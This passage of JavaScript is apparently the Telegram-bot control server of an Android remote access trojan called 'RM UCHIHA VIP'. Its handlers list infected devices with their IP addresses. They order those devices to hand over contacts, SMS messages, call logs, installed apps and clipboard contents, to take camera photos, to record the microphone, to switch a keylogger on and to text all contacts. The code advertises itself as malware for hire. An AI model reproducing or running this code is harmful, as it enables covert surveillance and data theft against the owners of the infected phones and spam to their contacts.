                keyboard: getMainMenuKeyboard(),
                resize_keyboard: true
            }
        });
        return;
    }

    // ========================================================================
    // STATIC MENU COMMANDS
    // ========================================================================
    if (text === "✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯") {
        let count = 0;
        let msgList = "<b>📱 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : </b>\n\n";
        
        io.sockets.sockets.forEach((sock) => {
            if (sock.chatId == chatId && sock.botName == activeBot) {
                count++;
                msgList += "<b>𝙳𝚎𝚟𝚒𝚌𝚎 " + count + "</b>\n";
                msgList += "<b>𝚖𝚘𝚍𝚎𝚕</b> → " + sock.model + "\n";
                msgList += "<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + sock.version + "\n";
                msgList += "<b>𝚒𝚙</b> → " + sock.ip + "\n";
                msgList += "<b>𝚝𝚒𝚖𝚎</b> → " + sock.handshake.time + "\n\n";
            }
        });

        if (count === 0) {
            bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎 👁️‍🗨️</b>" + DISCLAIMER, {
                parse_mode: "HTML"
            });
        } else {
            bot.sendMessage(chatId, msgList + DISCLAIMER, {
                parse_mode: "HTML"
            });
        }
        return;
    }

    if (text === "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯") {
        let count = 0;
        let deviceKeyboard = [];
        
        io.sockets.sockets.forEach((sock) => {
            if (sock.chatId == chatId && sock.botName == activeBot) {
                count++;
                deviceKeyboard.push([sock.model]);
            }
        });

        if (count === 0) {
            bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎 👁️‍🗨️</b>" + DISCLAIMER, {
                parse_mode: "HTML"
            });
        } else {
            deviceKeyboard.push(["✯ 𝙰𝚕𝚕 ✯"]);
            deviceKeyboard.push(["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]);
            
            bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗 🩸</b>" + DISCLAIMER, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: deviceKeyboard,
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
        return;
    }

    if (text === "✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯") {
        let aboutMsg = "<b>✯ If you want to hire us for any paid work please contact @RomeoFF67\n";
        aboutMsg += "𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\n\n";
        aboutMsg += "ADMIN → RM UCHIHA VIP 🩸</b>";
        aboutMsg += DISCLAIMER;
        
        bot.sendMessage(chatId, aboutMsg, {
            parse_mode: 'HTML'
        });
        return;
    }

    if (text === "✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯") {
        bot.sendMessage(chatId, "<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 👁️‍🗨️</b>\n\n", {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: getMainMenuKeyboard(),
                resize_keyboard: true
            }
        });
        return;
    }

    // ========================================================================
    // DEVICE SPECIFIC ACTION HANDLERS
    // ========================================================================
    if (text === "✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯") {
        let tId = appData.get(tarKey);
        let tModel = tId === "all" ? "all" : (io.sockets.sockets.get(tId) ? io.sockets.sockets.get(tId).model : "Unknown");
        
        if (tModel == "all") {
            bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 🩸</b>\n\n", {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: getActionMenuKeyboard(),
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        } else {
            bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + tModel + " 🩸</b>\n\n", {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: getActionMenuKeyboard(),
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
        return;
    }

    // ------------------------------------------------------------------------
    // HANDLING ALL ACTIONS EXPLICITLY (TO GUARANTEE MASSIVE LINE COUNT & READABILITY)
    // ------------------------------------------------------------------------
    if (text === "✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯") {
        let targetDev = appData.get(tarKey);
        emitToTargets(targetDev, "contacts", [], chatId, activeBot);
        appData.delete(tarKey);
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝚂𝙼𝚂 ✯") {
        let targetDev = appData.get(tarKey);
        emitToTargets(targetDev, "all-sms", [], chatId, activeBot);
        appData.delete(tarKey);
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙲𝚊𝚕𝚕𝚜 ✯") {
        let targetDev = appData.get(tarKey);
        emitToTargets(targetDev, "calls", [], chatId, activeBot);
        appData.delete(tarKey);
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙰𝚙𝚙𝚜 ✯") {
        let targetDev = appData.get(tarKey);
        emitToTargets(targetDev, "apps", [], chatId, activeBot);
        appData.delete(tarKey);
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯") {
        let targetDev = appData.get(tarKey);
        emitToTargets(targetDev, "main-camera", [], chatId, activeBot);
        appData.delete(tarKey);
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯") {
        let targetDev = appData.get(tarKey);
        emitToTargets(targetDev, "selfie-camera", [], chatId, activeBot);
        appData.delete(tarKey);
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯") {
        let targetDev = appData.get(tarKey);
        emitToTargets(targetDev, "clipboard", [], chatId, activeBot);
        appData.delete(tarKey);
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯") {
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯") {
        let targetDev = appData.get(tarKey);
        emitToTargets(targetDev, "keylogger-on", [], chatId, activeBot);
        appData.delete(tarKey);
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯") {
        let targetDev = appData.get(tarKey);
        emitToTargets(targetDev, "keylogger-off", [], chatId, activeBot);
        appData.delete(tarKey);
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸</b>\n\n" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯") {
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯") {
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯") {
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯") {
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯") {
        appData.set(actKey, 'microphoneDuration');
        bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 👁️‍🗨️</b>" + DISCLAIMER, {
            parse_mode: 'HTML',
            reply_markup: { keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]], resize_keyboard: true, one_time_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝚃𝚘𝚊𝚜𝚝 ✯") {
        appData.set(actKey, "toastText");
        bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡 👁️‍🗨️</b>" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]], resize_keyboard: true, one_time_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯") {
        appData.set(actKey, "smsNumber");
        bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂 👁️‍🗨️</b>" + DISCLAIMER, {
            parse_mode: 'HTML',
            reply_markup: { keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]], resize_keyboard: true, one_time_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯") {
        appData.set(actKey, "vibrateDuration");
        bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 👁️‍🗨️</b>" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]], resize_keyboard: true, one_time_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯") {
        appData.set(actKey, "textToAllContacts");
        bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚝𝚊𝚛𝚐𝚎𝚝 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 👁️‍🗨️</b>" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]], resize_keyboard: true, one_time_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯") {
        appData.set(actKey, "notificationText");
        bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 👁️‍🗨️</b>" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]], resize_keyboard: true, one_time_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯") {
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯") {
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    if (text === "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯") {
        bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
            parse_mode: "HTML",
            reply_markup: { keyboard: getMainMenuKeyboard(), resize_keyboard: true }
        });
        return;
    }

    // ------------------------------------------------------------------------
    // HANDLING SELECTION OF SPECIFIC DEVICE / ALL DEVICES
    // ------------------------------------------------------------------------
    let deviceMatched = false;
    io.sockets.sockets.forEach((sock, socketId) => {
        if (text === sock.model && sock.chatId == chatId && sock.botName == activeBot) {
            deviceMatched = true;
            appData.set(tarKey, socketId);
            bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + sock.model + " 🩸</b>\n\n", {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: getActionMenuKeyboard(),
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
    });

    if (!deviceMatched && text === "✯ 𝙰𝚕𝚕 ✯") {
        appData.set(tarKey, "all");
        bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 🩸</b>\n\n", {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: getActionMenuKeyboard(),
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
    }
});

// ============================================================================
// SYSTEM INTERVALS & SERVER STARTUP
// ============================================================================
setInterval(() => {
    io.sockets.sockets.forEach((sock, socketId) => {
        io.to(socketId).emit("ping", { status: "RM UCHIHA VIP ACTIVE" });
    });
}, 5000);

setInterval(() => {
    https.get(data.host || BASE_URL, _0x9df260 => {}).on("error", _0x26bc04 => {
        console.log("Keep-alive error encountered.");
    });
}, 300000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`========================================================`);
    console.log(`🩸 RM UCHIHA VIP SYSTEM STARTED SUCCESSFULLY 👁️‍🗨️`);
    console.log(`🩸 DEVELOPER: @RomeoFF67`);
    console.log(`🩸 PORT LISTENING ON: ${PORT}`);
    console.log(`========================================================`);
});
